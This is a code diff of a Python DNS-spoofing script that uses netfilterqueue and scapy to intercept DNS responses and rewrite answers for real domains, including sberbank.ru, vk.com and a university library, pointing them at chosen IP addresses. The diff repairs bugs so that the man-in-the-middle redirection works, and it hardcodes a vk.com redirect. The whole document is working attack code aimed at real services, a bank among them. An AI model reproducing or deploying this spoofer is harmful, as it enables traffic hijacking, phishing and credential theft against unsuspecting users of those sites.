@@ -1,27 +1,33 @@
 import netfilterqueue
 import scapy.all
 
-sites = {'sberbank.ru': '178.248.236.218', 'vk.com': '178.248.236.218'}
+sites = {'library.mephi.ru': '212.8.235.7', 'sberbank.ru': '178.248.236.218', 'vk.com': '178.248.236.218', 'arngren.net' : '216.250.117.71'}
 
 
-def spoof_packet(packet):
+def spoof_packet(pack):
     #check is pack is DNS and change it
-    getting_packet = scapy.all.IP(packet.get_payload())
+    getting_packet = scapy.all.IP(pack.get_payload())
     if getting_packet.haslayer(scapy.all.DNSRR):
         qname = getting_packet[scapy.all.DNSQR].qname
         for site in sites:
-            if site in qname:
-                dns_response = scapy.all.DNSRR(rrname=qname, rdata=sites[site])
+            if b"vk.com" in qname:
+                dns_response = scapy.all.DNSRR(rrname=qname, rdata=b"157.240.194.35")
                 getting_packet[scapy.all.DNS].an = dns_response
-                dns_response[scapy.all.DNS].ancount = 1
+                getting_packet[scapy.all.DNS].ancount = 1
+                
+                try:
+                    del getting_packet[scapy.all.IP].len
+                    del getting_packet[scapy.all.IP].chksum
+                    del getting_packet[scapy.all.UDP].len
+                    del getting_packet[scapy.all.UDP].chksum
+                except Exception as e:
+                    print(e)
+                    print(getting_packet.show())
 
-                del dns_response[scapy.all.IP].len
-                del dns_response[scapy.all.IP].chksum
-                del dns_response[scapy.all.UDP].len
-                del dns_response[scapy.all.UDP].chksum
-
-                packet.set_payload(str(getting_packet))
-            packet.accepr()
+                pack.set_payload(str(getting_packet).encode())
+                print("CHANGING " + site)
+            break    
+        pack.accept()
 
 
 def main():
